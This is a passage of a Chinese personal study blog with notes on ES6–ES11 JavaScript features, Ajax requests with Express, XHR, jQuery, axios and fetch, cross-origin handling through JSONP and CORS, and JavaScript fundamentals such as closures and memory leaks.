<p>es6的写法: 可以随意命名  在属性groups中出现别名和值<br>const reg&#x3D;&#x2F;<a href="(?<url>.*)">(?<text>.*)</a>&#x2F;<br>const result&#x3D;reg.exec(str);<br>console.log(result.groups.url)<br>console.log(result.groups.text)</p>
<h4 id="es9正则扩展-正向断言-反向断言"><a href="#es9正则扩展-正向断言-反向断言" class="headerlink" title="es9正则扩展:正向断言 反向断言 :"></a>es9正则扩展:正向断言 反向断言 :</h4><p>前瞻:<br>根据当前匹配的后边内容 来判断前面的内容是不是合法的</p>
<p>(reg.exec(str) 的作用是专门在正则中查找字符串中所有敏感词的内容和位置的函数。找到一个敏感词，就会返回一个数组)<br>如 动态提取 555<br>var str&#x3D;’123arg么555啦啦啦’<br>const reg&#x3D;&#x2F;\d+(?&#x3D;啦)&#x2F;</p>
<p>const result&#x3D;reg.exec(str); 这里\d+就是敏感词<br>console.log(result) </p>
<p>后瞻:<br>根据前面的内容做判断</p>
<p>var str&#x3D;’123arg555啦啦啦’<br>const reg&#x3D;&#x2F;(?&lt;&#x3D;么)\d+&#x2F;</p>
<p>const result&#x3D;reg.exec(str); 这里\d+就是敏感词<br>console.log(result) </p>
<h4 id="正则扩展-dotAll模式"><a href="#正则扩展-dotAll模式" class="headerlink" title="正则扩展:dotAll模式:"></a>正则扩展:dotAll模式:</h4><p>dot . 元字符 除换行符以外的任意单个字符</p>
<p>let str&#x3D;&#96;<br>&lt; ul&gt;<br>&lt; li&gt;<br>&lt; a&gt;肖生客&lt; &#x2F;a&gt;<br>&lt; p&gt;上映时间&lt; &#x2F;p&gt;<br>&lt;&#x2F; li&gt;</p>
<p>&lt; li&gt;<br>&lt; a&gt;肖生客&lt; &#x2F;a&gt;<br>&lt; p&gt;上映时间&lt; &#x2F;p&gt;<br>&lt;&#x2F; li&gt;<br>&lt; &#x2F;ul&gt;&#96;</p>
<p>匹配出<br>电影名称和时间</p>
<p>没有使用dotAll模式之前:</p>
<p>const  reg&#x3D;&#x2F;&lt; li&gt;\s+&lt; a&gt;(.*?)&lt; &#x2F;a&gt;\s+&lt; p&gt;\s+(.*？)&lt;&#x2F; li&gt;&#x2F;</p>
<p>const result&#x3D;reg.exec(str)；<br>console.log(result)</p>
<p>使用dotAll模式后  多了一个模式修正符s 有了这个模式以后  .就可以匹配任意字符 包括换行符<br>const  reg&#x3D;&#x2F;&lt; li&gt;.<em>?&lt; a&gt;(.</em>?)&lt; &#x2F;a&gt;\s+&lt; p&gt;.*?(.*？)&lt;&#x2F; li&gt;&#x2F;</p>
<h4 id="es10-对象的扩展方法-Object-fromEntries"><a href="#es10-对象的扩展方法-Object-fromEntries" class="headerlink" title="es10 对象的扩展方法 Object.fromEntries:"></a>es10 对象的扩展方法 Object.fromEntries:</h4><p>用来创建对象<br>参数为二维数组或map</p>
<p>const result&#x3D;Object.fromEntries([<br>[‘name’:’尚硅谷’],<br>[‘xueke’,’前端’]<br>])</p>
<p>const m&#x3D;new Map()</p>
<p>Object.fromEntries(m)</p>
<h4 id="es10"><a href="#es10" class="headerlink" title="es10:"></a>es10:</h4><p>let str&#x3D;’ arg ‘</p>
<p>str.trimStart()  清除左侧空格<br>str.trimEnd()  清楚右侧空格</p>
<h4 id="es10数组方法扩展"><a href="#es10数组方法扩展" class="headerlink" title="es10数组方法扩展:"></a>es10数组方法扩展:</h4><p>flat 将多维数组转换为低维数组<br>const arr&#x3D;[1,2,3,[4,5,6,[7,8]]];<br>arr.flat()  默认降低一个维度<br>arr.flat(2)  可以指定降低几个维度</p>
<p>flatMap  flat与map的结合<br>如果返回的结果是多维度数组  可以将他降低维度<br>var arr&#x3D;[2,3,4];<br>arr.flatMap(item&#x3D;&gt;[item*10])<br>结果还是一维数组</p>
<h4 id="es10：Symbol-prototype-description"><a href="#es10：Symbol-prototype-description" class="headerlink" title="es10：Symbol.prototype.description:"></a>es10：Symbol.prototype.description:</h4><p>var s&#x3D;Symbol(‘尚硅谷’)<br>s.description : 尚硅谷</p>
<h4 id="es11-私有属性"><a href="#es11-私有属性" class="headerlink" title="es11:私有属性:"></a>es11:私有属性:</h4><p>class Person{<br>公有属性<br>name；</p>
<p>私有属性(只能通过 调用类里面函数使用，在外部无法直接使用)<br>井号age;<br>井号weight;<br>constructor(name,age,weight){<br>this.name&#x3D;name;<br>this.井号age&#x3D;age;<br>this.井号weight&#x3D;weight;<br>}</p>
<p>intro(){<br>console.log(this.井号age)<br>}</p>
<p>}</p>
<p>var m&#x3D;new Person(1,2,3)<br>m.name 1<br>m.井号age 报错</p>
<h4 id="es11-Promise-allSettled"><a href="#es11-Promise-allSettled" class="headerlink" title="es11:Promise.allSettled"></a>es11:Promise.allSettled</h4><p>接受一个promise的数组作为参数<br>返回的结果状态永远都是成功的状态<br>值是里面每一个promise的状态与结果</p>
<p>Promise.allSettled([p1,p2]) （适用于每一个异步任务都想得到一个结果）</p>
<p>与之类似的   promise.all（适用于每一个异步任务都成功才会往下执行）<br>也是 接受一个promise的数组作为参数<br>但里面只要有一个promise失败，则返回的结果就是失败的，并且最后返回的值就是失败状态的promise的值<br>只有当所有成功，结果才成功，成功后的值，是所有promise成功的值组成的数组</p>
<h4 id="es11可选链子操作符"><a href="#es11可选链子操作符" class="headerlink" title="es11可选链子操作符:"></a>es11可选链子操作符:</h4><p>避免了做层层判断<br>function main(config){</p>
<p>原来是这样的  const s&#x3D;config&amp;&amp;config.db&amp;&amp;config.db.host</p>
<p>const s&#x3D;config?.db？.host  (?.判断前面的值有没有传入,如果传了就读取后面的db属性)</p>
<p>}</p>
<p>main({<br>db:{<br>host:1,<br>username:2</p>
<p>}</p>
<p>})</p>
<h4 id="es11：动态import-按需加载，懒加载"><a href="#es11：动态import-按需加载，懒加载" class="headerlink" title="es11：动态import()(按需加载，懒加载):"></a>es11：动态import()(按需加载，懒加载):</h4><p>等到用的时候再导入<br>import()  import函数的返回结果为一个promise对象  而这个promise对象成功的值就是暴露模块的对象</p>
<p>import(‘.&#x2F;1.js’).then(module&#x3D;&gt;{<br>module.hello();<br>})</p>
<h4 id="es11：BigInt："><a href="#es11：BigInt：" class="headerlink" title="es11：BigInt："></a>es11：BigInt：</h4><p>大整数类型<br>let a&#x3D;521n;  n表示大整形</p>
<p>let n&#x3D;123;<br>BigInt(n) 123n</p>
<p>用来进行大数值运算</p>
<p>let max&#x3D;Number.MAX_SAFE_INTEGER;<br>max+1<br>max+2 这里已经不能再大了 这里+2与+1是一样的</p>
<p>但可以<br>BigInt(max)+BigInt(1)<br>BigInt(max)+BigInt(2)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/22/ES6-11/" data-id="cl1dgisu70001ngno4o9b78lk" data-title="ES6-11" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ajax" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/03/17/ajax/" class="article-date">
  <time class="dt-published" datetime="2022-03-17T12:43:05.000Z" itemprop="datePublished">2022-03-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/03/17/ajax/">ajax</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点:"></a>优缺点:</h4><p>优势:可以在页面不刷新的情况下向服务端发起请求<br>允许你根据用户事件(鼠标 放在元素上和离开,键盘,表单)来更新部分页面内容</p>
<p>缺点:没有浏览历史，不能回退<br>存在跨域问题(同源)</p>
<h4 id="Http协议"><a href="#Http协议" class="headerlink" title="Http协议:"></a>Http协议:</h4><p>也叫做超文本传输协议<br>规定了 浏览器和万维网服务器之间互相通信的规则<br>是一种约定,规则<br>请求(也称为请求报文  浏览器给服务器发的内容):</p>
<p>请求行: 请求类型(get post delete …) url路径  Http&#x2F;1.1（http协议版本）</p>
<p>请求头 包括  Host:atguigu.com<br>Cookie:name&#x3D;guigu<br>Content-type:application&#x2F;x-www-form-urlencoded<br>User-Agent:chrome 83</p>
<p>空行(没有实际意义)</p>
<p>请求体 username&#x3D;admin&amp;password&#x3D;admin</p>
<p>响应(也称为响应报文  服务器给浏览器返回的结果):</p>
<p>响应行： Http&#x2F;1.1(http协议版本)  200(响应状态码)  OK(响应状态字符串)</p>
<p>响应头：Content-Type:text&#x2F;html;charset&#x3D;utf-8<br>Content-Iength:2048<br>Content-encoding:gzip</p>
<p>（空行）</p>
<p>响应体:<html></p>
<head>
</head>
<body>
</body>
</html>



<p>若在浏览器中查看：<br>鼠标右击-&gt;检查 -&gt;网络(全部)-&gt;刷新-&gt;点击最上面一个请求<br>显示的内容中<br>载荷:请求的参数</p>
<h4 id="ajax-express框架"><a href="#ajax-express框架" class="headerlink" title="ajax-express框架:"></a>ajax-express框架:</h4><p>基于nodejs</p>
<p>在最外层位置启动终端<br>初始化: npm init –yes（npm是Nodejs下的一个包管理工具）<br>npm i express</p>
<p>（根目录下）建立一个js文件<br>引入express :<br>1 const express&#x3D;require(“express”)</p>
<p>创建应用对象:<br>2 const app&#x3D;express();</p>
<p>创建路由规则:<br>requst是对请求报文的封装<br>response是对响应报文的封装<br>3 app.get(‘&#x2F;‘,(request.response)&#x3D;&gt;{<br>设置响应体<br>response.send(“hello express”) 还可以放语句  如response.send(‘console.log(“hello”)’)<br>})</p>
<p>监听端口启动服务<br>4 app.listen(8000，（）&#x3D;&gt;{<br>console.log(“服务已经启动，8000端口监听中”)<br>})<br>(代表的网址  <a target="_blank" rel="noopener" href="http://127.0.0.1:8000/">http://127.0.0.1:8000</a>)<br>然后在这个js文件用终端打开  node  js文件名称<br>然后 回车</p>
<p>案例:<br>1.js<br>上述一样，改动有<br> app.get(‘&#x2F;server’,(request.response)&#x3D;&gt;{<br>设置响应头 允许跨域<br>response.setHeader(‘Access-Control-Allow-Origin’,’*’) &#x2F;&#x2F;Control有写错过，导致跨域失败</p>
<p>设置响应体<br>response.send(“hello express”)<br>})</p>
<p>对应网址（<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server%EF%BC%89">http://127.0.0.1:8000/server）</a></p>
<p>1.html</p>
<p>ajax操作</p>
<p>1 创建对象<br>const xhr&#x3D;new XMLHttpRequest()</p>
<p>2 初始化(设置请求方法和url)<br>xhr.open(‘GET’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server&#39;">http://127.0.0.1:8000/server&#39;</a>)</p>
<p>3 发送<br>xhr.send();</p>
<p>4 事件绑定 处理服务端返回的结果<br>on when 当…时候<br>readystate是xhr对象中的属性 表示状态 有5个值<br>0 未初始化  最开始的属性就是0<br>1 表示 open方法已经调用完毕<br>2 表示 send方法已经调用完毕<br>3 表示 服务端返回了 部分结果<br>4 表示 服务端返回了  所有结果</p>
<p>change 改变<br>xhr.onreadystatechange&#x3D;function(){<br>if(xhr.readyState&#x3D;&#x3D;4) 当服务端返回了所有结果时 并且 服务器的返回的响<br>应状态码为200<br>if(xhr.status&#x3D;&#x3D;200&amp;&amp;xhr.status&lt;300){<br>console.log(xhr.status) 响应行里面的响应状态码<br>console.log(xhr.statusText) 响应状态字符串<br>console.log(xhr.getAllResponseHeaders()) 所有响应头<br>console.log(xhr.response) 响应体</p>
<p>。。。.innerHTML&#x3D;xhr.response;<br>}<br>}</p>
<p>响应状态码中<br>2xx:2开头的都表示成功</p>
<p>重启f2</p>
<p>如果在get请求中要传递参数:<br>xhr.open(‘GET’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server%EF%BC%9Fa=100&amp;b=200&amp;c=300&#39;">http://127.0.0.1:8000/server？a=100&amp;b=200&amp;c=300&#39;</a>)</p>
<p>如果上述案例为post请求:<br>xhr.open(‘GET’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server&#39;">http://127.0.0.1:8000/server&#39;</a>)<br>改为<br>xhr.open(‘POST’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server&#39;">http://127.0.0.1:8000/server&#39;</a>)</p>
<p> app.get改为<br>app.post</p>
<p>如果在post请求中传递参数（请求体）<br>xhr.send(“a&#x3D;100&amp;b&#x3D;200&amp;c&#x3D;300”);或者 xhr.send(“a:100&amp;b:200&amp;c:300”);</p>
<p>如果要设置请求头:<br>xhr.setRequestHeader(‘Content-Type’,’application&#x2F;x-www-form-urlencoded’)<br>Content-type是预定义的<br>Content-type:用来设置请求体内容的类型<br>application…:用来设置参数的类型</p>
<p>如果想要自定义的    请求头<br>如:<br>xhr.setRequestHeader(‘name’,’atguigu’)<br>这样服务器那边需要加上<br>response.setHeader(‘Access-Control-Allow-Headers’,’*’)  *表示所有头类型的信息都能接受</p>
<p>以及<br>app.post改为<br>app.all(.. 可以接受任意类型的请求 get,post,delete,options,…</p>
<p>如果服务器向要返回一个对象给浏览器<br>由于<br>response.send(“”)里面只能是一个字符串</p>
<p>所以需要将对象转化为字符串<br>如<br>const data&#x3D;{<br>name:’atguigu’<br>}<br>let str&#x3D;JSON.stringify(data)<br>response.send(str)</p>
<p>对应的<br>在浏览器接受数据的时候<br>将字符串转化为对象(这是手动设置)<br>let data&#x3D;JSON.parse(xhr.response)</p>
<p>还可以用一种自动设置的模式<br>xhr.responseType&#x3D;’json’</p>
<p>为避免改动代码时需要重新启动:<br>npm install  -g nodemon</p>
<p>重新启动时<br>nodemon 1.js</p>
<h4 id="IE缓存问题"><a href="#IE缓存问题" class="headerlink" title="IE缓存问题:"></a>IE缓存问题:</h4><p>ie会将ajax请求的结果缓存下来，导致当服务器的数据发生改变时，不能即使的响应给浏览器，因为走的是缓存路线<br>如:xhr.open(‘GET’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server&#39;">http://127.0.0.1:8000/server&#39;</a>)<br>需改为<br>xhr.open(‘GET’,’<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/server?t=&#39;+Date.now()">http://127.0.0.1:8000/server?t=&#39;+Date.now()</a>)  加上一个时间戳<br>这时候就不会走缓存了，而是重新向服务器发起请求</p>
<h4 id="超时与网络异常处理"><a href="#超时与网络异常处理" class="headerlink" title="超时与网络异常处理:"></a>超时与网络异常处理:</h4><p>服务器端:<br>setTimeout(()&#x3D;&gt;{<br>response.send(“…”);<br>},3000)</p>
<p>浏览器端超时设置:<br>xhr.timeout&#x3D;2000;<br>xhr.ontimeout&#x3D;function(){<br>alert(“网络异常…”)<br>}</p>
<p>浏览器端的网络异常回调:<br>xhr.onerror&#x3D;function(){<br>alert(“…”)<br>}</p>
<h4 id="取消ajax请求"><a href="#取消ajax请求" class="headerlink" title="取消ajax请求:"></a>取消ajax请求:</h4><p>let xhr&#x3D;null;</p>
<p>xhr&#x3D;new XMLHttpRequest()</p>
<p>.. .onclick&#x3D;function（）{<br>xhr.abort();<br>}</p>
<h4 id="ajax重复发送请求的情况"><a href="#ajax重复发送请求的情况" class="headerlink" title="ajax重复发送请求的情况:"></a>ajax重复发送请求的情况:</h4><p>为减少服务器压力</p>
<p>let isSending&#x3D;false;是否正在发ajax请求 false没法  true正在发送</p>
<p>..onclick&#x3D;function（）{<br>if(isSending){ 当下次重复发送的时候  上次的还处于发送状态 就取消掉<br>x.abort();<br>}</p>
<p>const xhr&#x3D;new XMLHttpRequest()<br>isSending&#x3D;true 表示正在发送<br>…<br>xhr.onreadystatechange&#x3D;function(){<br>if（xhr.readystate&#x3D;&#x3D;4）{<br>isSending&#x3D;false;  请求成功了下次就不需要再发送，不用再重复执行代码<br>}</p>
<p>}<br>}</p>
<h4 id="在jquery中如何发送ajax请求"><a href="#在jquery中如何发送ajax请求" class="headerlink" title="在jquery中如何发送ajax请求:"></a>在jquery中如何发送ajax请求:</h4><p>搜 bootcdn<br>粘贴链接<br>$(‘button’).eq(0).click(function(){<br>$.get(   get后面四个参数<br>“<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/jquery-server&quot;">http://127.0.0.1:8000/jquery-server&quot;</a>,<br>{<br>a:100,<br>b:200<br>},<br>function(data){<br>data 为响应体<br>})<br>}，<br>‘json’) 设置响应体类型</p>
<p>post请求也一样的</p>
<p>主要在这里:<br>$(‘button’).eq(1).click(function(){<br>$.ajax({<br>url：”<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/jquery-server&quot;">http://127.0.0.1:8000/jquery-server&quot;</a>, 给谁发<br>data:{a:100,b:200},  参数<br>type:’GET’,请求类型<br>dataType：’json’, 响应体结果设置<br>success：function(data){ 成功的回调</p>
<p>},<br>timeout:2000,超时时间<br>error:function(){ 失败的回调</p>
<p>},<br>headers:{<br>c:300,<br>d:400<br>}</p>
<p>})</p>
<h4 id="使用axios发送ajax请求："><a href="#使用axios发送ajax请求：" class="headerlink" title="使用axios发送ajax请求：####"></a>使用axios发送ajax请求：####</h4><p>引入链接后</p>
<p>axios.get(‘<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/axios-server&#39;,{">http://127.0.0.1:8080/axios-server&#39;,{</a> 第二个参为一个对象<br>params:{参数<br>id:100<br>}，<br>headers:{请求头信息<br>name:’atguigu’<br>}</p>
<p>}</p>
<p>)</p>
<p>还可以在外边配置baseURL<br>axios.defaults.baseURL&#x3D;’<a href="http://127.0.0.1:8080&#39;">http://127.0.0.1:8080&#39;</a><br>axios.get(‘axios-server’,…)</p>
<p>如果是post请求<br>axios.post(‘<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/axios-server&#39;">http://127.0.0.1:8080/axios-server&#39;</a>,<br>data:{请求体信息<br>username:123,<br>passward:456<br>}，<br>{其他配置<br>{<br>params:{参数<br>id:100<br>}，<br>headers:{请求头信息<br>name:’atguigu’<br>},<br>}</p>
<p>}</p>
<p>)</p>
<p>axios还可以这样发送请求<br>axios({<br>method:’POST’,<br>url:’…’,<br>params:{level:30},<br>headers:{a:100},<br>data:{username:1}请求体</p>
<p>})</p>
<h4 id="使用fetch发送ajax请求"><a href="#使用fetch发送ajax请求" class="headerlink" title="使用fetch发送ajax请求:"></a>使用fetch发送ajax请求:</h4><p>fetch属于全局对象的，可以直接调用<br>fetch(‘<a target="_blank" rel="noopener" href="http://127.../?vip=10&#39;,{">http://127...?vip=10&#39;,{</a><br>method:’POST’<br>header：{name：’atguigu’},<br>body:’user&#x3D;admin&amp;password&#x3D;admin’<br>})</p>
<h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域:"></a>跨域:</h4><p>同源策略:是浏览器的一种安全策略<br>同源(同一个来源): 协议 域名 端口号 必须完全一样<br>违背同源策略就是跨域</p>
<p>服务器端:<br>response.sendFile(__dirname+’&#x2F;index.html’) 响应一个页面</p>
<p>一个Url(http:127.0.0.1:9000&#x2F;person)下的按钮点击后访问另一个url（http:127.0.0.1:9000&#x2F;data）<br>协议,域名，端口可以省略，浏览器会默认加上<br>x.open(‘GET’,’&#x2F;data’)</p>
<h4 id="如何解决跨域"><a href="#如何解决跨域" class="headerlink" title="如何解决跨域:"></a>如何解决跨域:</h4><p>JSONP：只支持get请求<br>利用script标签的跨域能力来发送请求的<br>天生具有跨域能力的标签:img link iframe script<br>服务端返回函数调用并且把参数放在里面<br>response.send(‘console.log(“hello”)’)<br>如在<br>2.html：</p>
<script>
function hander(data){
.. .innerHTML=data....
}
</script>
<script src='...2.js'></script>

<p>在2.js中:<br>app&#x2F;all(‘jsonp-server’,’….’)</p>
<p>回调里加上<br>response.end(<code>handle($&#123;str&#125;)</code>)</p>
<p>如果vscode中用live server打开<br><a target="_blank" rel="noopener" href="http://127.0.0.1:5500/1.html">http://127.0.0.1:5500/1.html</a><br>如果是 in Default Browsers访问<br>file:&#x2F;&#x2F;&#x2F;G:&#x2F;rain&#x2F;1.html</p>
<h4 id="设置cors响应头实现跨域"><a href="#设置cors响应头实现跨域" class="headerlink" title="设置cors响应头实现跨域:"></a>设置cors响应头实现跨域:</h4><p>支持get和post请求<br>主要通过在服务端设置响应头</p>
<p>response.setHeader(‘Access-Control-Allow-Origin’,’*’)<br>第2个参数也可以特指某一个url ‘http:127.0.0.1:5050’</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/17/ajax/" data-id="cl1dgisua0002ngno7t732gc6" data-title="ajax" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-js2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/02/25/js2/" class="article-date">
  <time class="dt-published" datetime="2022-02-25T12:24:11.000Z" itemprop="datePublished">2022-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/02/25/js2/">js2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="new-…-期间发生的事情"><a href="#new-…-期间发生的事情" class="headerlink" title="new …()期间发生的事情:"></a>new …()期间发生的事情:</h4><p>1 立刻创建一个新的对象<br>2 将新建的对象作为函数中的this<br>3 逐行执行函数中的代码<br>4 将新建立的对象作为返回值返回</p>
<h4 id="this指向"><a href="#this指向" class="headerlink" title="this指向:"></a>this指向:</h4><p>以函数的形式调用,this永远都是window<br>以方法的形式调用，this就是调用方法的那个对象<br>以构造函数的形式调用，this就指向被创建出来的那个对象<br>使用call与apply方法调用时.this是指定的那个对象</p>
<p>任何函数本质上都是通过某个对象来调用的,如果没有直接指定就是window<br>所有函数内部都有一个变量this，它的值是调用函数的当前对象</p>
<h4 id="null与undefined的区别"><a href="#null与undefined的区别" class="headerlink" title="null与undefined的区别:"></a>null与undefined的区别:</h4><p>undefined:定义了但没有赋值<br>null:定义了也赋值了，值就是null</p>
<h4 id="什么时候给变量赋值为null"><a href="#什么时候给变量赋值为null" class="headerlink" title="什么时候给变量赋值为null:"></a>什么时候给变量赋值为null:</h4><p>初始赋值，表明将要赋值为对象<br>结束前，让变量的指向的对象成为垃圾对象</p>
<p>什么是数据？数据的特点?什么是内存?什么是变量?内存分类?内存,数据,变量三者之间的关系?<br>存储在内存中代表特定的信息,本质上是0101..(二进制数)<br>可传递,可运算。<br>内存条通电后产生的可储存数据的空间(临时的)<br>可变化的量,由变量名和变量值组成,每个变量都对象一块小内存，变量名用来查找对象的内存，变量值就是内存中保存的数据<br>栈:全局变量和局部变量  堆:对象。<br>内存是用来存储数据的空间，变量时内存的标识。</p>
<h4 id="js引擎如何管理内存"><a href="#js引擎如何管理内存" class="headerlink" title="js引擎如何管理内存:"></a>js引擎如何管理内存:</h4><p>分配小内存空间,得到它的使用权<br>存储数据，可以反复进行操作<br>释放当前的小内存空间</p>
<p>function fn（）{<br>var obj&#x3D;{};<br>}<br>fn();调用完后 obj是自动释放,而obj所指向的对象是在后面的某个时刻有垃圾回收器回收</p>
<h4 id="什么是对象-为什么要用对象-对象的组成？如何访问对象内部数据-什么时候必须使用-‘属性名’-："><a href="#什么是对象-为什么要用对象-对象的组成？如何访问对象内部数据-什么时候必须使用-‘属性名’-：" class="headerlink" title="什么是对象?为什么要用对象?对象的组成？如何访问对象内部数据?什么时候必须使用[‘属性名’]："></a>什么是对象?为什么要用对象?对象的组成？如何访问对象内部数据?什么时候必须使用[‘属性名’]：</h4><p>多个数据的封装体,用来保存多个数据的容器,一个对象代表现实中的一个事物。<br>统一管理多个数据。<br>属性:属性值(字符串)和属性值组成  方法：一种特别的属性<br>.属性名 (有时不能用)   [‘属性名’] 通用<br>1 属性名包含特殊字符,如 _ 空格 p.content-type&#x3D;… 不能用  p[“content-type”]&#x3D;… 可行，<br>2 变量名不确定<br>var propName&#x3D;’age’<br>var value&#x3D;18<br>p.propName&#x3D;value 不可行  直接属性名当成了propName<br>p[propName]&#x3D;value  （中括号里面的是变量）可行</p>
<h4 id="什么是函数-为什么要用函数-如何定义函数-如何调用函数"><a href="#什么是函数-为什么要用函数-如何定义函数-如何调用函数" class="headerlink" title="什么是函数?为什么要用函数?如何定义函数?如何调用函数?"></a>什么是函数?为什么要用函数?如何定义函数?如何调用函数?</h4><p>实现特定功能的n条语句的封装体<br>提高代码复用,便于阅读交流<br>函数声明或者表达式(function fn(){}    var f&#x3D;function(){})<br>test() 直接调用<br>obj.test() 通过对象调用<br>new test（）  new调用<br>test.call&#x2F;apply(obj) 临时让test成为obj的方法进行调用(可以让一个函数成为指定任意对象的方法进行调用)</p>
<p>什么函数才是回调函数?<br>自己定义的  我没有调用  但最终执行了  （如定时器,dom事件）</p>
<h4 id="关于加不加分号？"><a href="#关于加不加分号？" class="headerlink" title="关于加不加分号？"></a>关于加不加分号？</h4><p>js中一条语句的后面可以不加分号<br>有两种情况下必须加分号:<br>1 小括号开头的前一条语句<br>var a&#x3D;3<br>;(function(){…})()  或者在在3后面加上分号也是一样的</p>
<p>2 中方括号的前一条语句<br>var b&#x3D;5<br>;[1,2].forEach(function(){})</p>
<p>合并压缩(合并:将多个js文件合成一个js文件 压缩:把换行,注释能干掉的干掉，然后把变量名,函数名都换成a,b,c,d,..不重复的)</p>
<h4 id="instanceof是如何判断的"><a href="#instanceof是如何判断的" class="headerlink" title="instanceof是如何判断的"></a>instanceof是如何判断的</h4><p>A instanceof B   如果B函数的显示原型对象在A对象的原型链上,返回true,不然就返回false</p>
<h4 id="执行上下文："><a href="#执行上下文：" class="headerlink" title="执行上下文："></a>执行上下文：</h4><p>在执行全局代码前将window确定为全局执行上下文<br>对全局数据进行预处理:<br>var 定义的全局变量 &#x3D;&#x3D;&gt;undefined 并添加为window的属性<br>function声明的全局函数 添加为window的方法<br>this 赋值为window<br>开始执行全局代码</p>
<h4 id="产生过几次执行上下文对象"><a href="#产生过几次执行上下文对象" class="headerlink" title="产生过几次执行上下文对象:"></a>产生过几次执行上下文对象:</h4><p>函数 执行 的次数+1（window全局）</p>
<h4 id="产生过几个作用域"><a href="#产生过几个作用域" class="headerlink" title="产生过几个作用域:"></a>产生过几个作用域:</h4><p>函数 定义 的个数+1(window全局)</p>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化:"></a>优化:</h4><p>for(var i&#x3D;0;length&#x3D;btns.length;i&lt;length;i++){}<br>这里第二步  如果是 i&lt;btns.length btns.length每次都需要计算，放在前面则只需要计算一次</p>
<h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包:"></a>闭包:</h4><p>产生的条件:<br>一个嵌套的内部(子)函数引用了嵌套的外部(父)函数的变量时，并且执行外部函数</p>
<p>闭包是是什么:<br>嵌套的内部函数</p>
<p>常见的闭包:<br>1 将函数作为另外一个函数的返回值<br>function fn1(){<br>var a&#x3D;1;<br>function fn2(){<br>a++;<br>console.log(a);<br>}<br>return fn2;<br>}</p>
<p>这里执行fn1()后  fn1,fn2变量名 都被释放了,但fn2所对应的对象没有被释放，因为有f指向这个对象,如果没有var f&#x3D;,那么这个fn2所指向的对象也会称为垃圾对象，被释放<br>var f&#x3D;fn1();<br>f();2<br>f();3</p>
<p>2 将函数作为实参传给另外一个函数调用<br>function showDelay(msg,time){<br>setTimeout(function(){<br>msg();<br>},3000)</p>
<p>showDelay(function(){console.log(1)},3000）</p>
<p>3 自定义js模块<br>具有特定功能的js文件<br>将所有数据和功能都封装在一个函数内部(私有的)<br>只向外暴露一个包含n个方法的对象或函数<br>模块的使用者只需要通过模块暴露的对象调用方法来实现对应的功能<br>如 Mymodule.js中<br>function Mymodule(){<br>var msg&#x3D;”hello the earth”;<br>function doSomething(){<br>console.log(msg.toUpperCase());<br>}<br>function doOtherthing(){<br>console.log(msg.toLowerCase());<br>}<br>return {<br>doSomething:doSomething,（这里前面代表的只是字符串，后面是函数名）<br>doOtherthing:doOtherthing<br>}<br>}</p>
<p>上述还可以写成匿名函数自调用的形式，然后通过window向外暴露出来:<br>（ function Mymodule(window){<br>var msg&#x3D;”hello the earth”;<br>function doSomething(){<br>console.log(msg.toUpperCase());<br>}<br>function doOtherthing(){<br>console.log(msg.toLowerCase());<br>}<br>window.module&#x3D; {<br>doSomething:doSomething,（这里前面代表的只是字符串，后面是函数名）<br>doOtherthing:doOtherthing<br>}<br>})(window)</p>
<p>如果:实参，形参中添加了window ,能方便代码压缩，都换成a,b,c,d,..等单个字母</p>
<p>在引入这个文件的文件的js模块中:<br>var module&#x3D;Mymodule();<br>module.doSomething();<br>module.doOtherthing();</p>
<p>函数执行时出现过几次闭包:<br>取决于 外部 函数执行的次数</p>
<p>闭包的作用:<br>函数内部的变量在函数执行完成后，仍然存活在内存中(延长了局部变量的声明周期)<br>在函数外部可以操作到函数内部的数据</p>
<p>闭包的死亡:<br>嵌套的内部函数称为垃圾对象时<br>如上述案例中:<br>执行 f&#x3D;null;</p>
<p>缺点:<br>函数执行完后，函数内的局部变量没有被释放，占用内存时间会变长。<br>容易造成内存泄漏</p>
<p>解决:<br>能不用闭包就不用闭包<br>即使释放</p>
<h4 id="内存溢出与内存泄漏："><a href="#内存溢出与内存泄漏：" class="headerlink" title="内存溢出与内存泄漏："></a>内存溢出与内存泄漏：</h4><p>内存溢出:<br>一种程序运行出现的错误<br>当程序运行需要的内存超过了剩余的内存时，就会抛出内存溢出的错误<br>如:<br>var obj&#x3D;{};<br>for(var i&#x3D;0;i&lt;100000;i++){<br>obj[i]&#x3D;new Array[10000000];<br>}<br>浏览器会直接崩溃</p>
<p>内存泄漏:<br>占用的内存没有及时释放<br>内存泄漏积累多了就会导致内存溢出</p>
<p>常见的内存泄漏:<br>1 意外的全局变量：<br> 如: function fn(){<br>a&#x3D;new Array[100000];<br>}</p>
<p>2 没有及时清理的定时器或者回调函数<br>setInterval(function（）{<br>console.log(1);<br>},1000)</p>
<p>3 闭包</p>
